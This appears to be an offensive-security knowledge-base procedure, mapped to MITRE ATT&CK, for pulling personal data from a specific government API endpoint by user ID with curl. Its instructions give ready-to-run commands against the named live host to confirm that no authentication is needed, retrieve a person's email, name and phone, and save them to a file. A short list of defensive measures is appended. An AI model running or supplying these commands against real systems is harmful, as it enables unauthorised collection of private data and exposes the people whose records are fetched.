---
id: uuid-curl-id-1
tags:
  - curl
  - data-fetch
  - api
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-fetch-user-by-id]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:19.862Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Fetch User Data via Curl with ID

## Summary

This procedure uses curl to request user data from the API endpoint using a specific ID, demonstrating unauthenticated access to PII.

## Description

Executes a GET on https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ to fetch JSON with user details. Suitable for command-line verification; no auth needed.

## Requirements

1. curl installed
2. Network access to target
3. Specific ID (e.g., 4750)

## Defense

Defensive measures and detection strategies:

- Require API keys or tokens
- Log curl-like user agents
- Block direct IP access if suspicious

## Objectives

1. Retrieve single user PII
2. Confirm no auth required
3. Parse JSON output

## Instructions

### Step 1: Execute Curl Request

**Context**: Send GET to endpoint with ID.

**Command** ([[commands/curl-fetch-user-by-id]]):

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/"
```

> Returns JSON with email, name, phone; status 200.

### Step 2: Save and Inspect

**Context**: Store response for review.

Add -o flag:

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/" -o user4750.json
```

> File contains full details; open to verify sensitive data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-user-by-id]]

## Tools Used

- [[tools/curl]]

## Tags

- [[tools/curl]]
- [[data-fetch]]
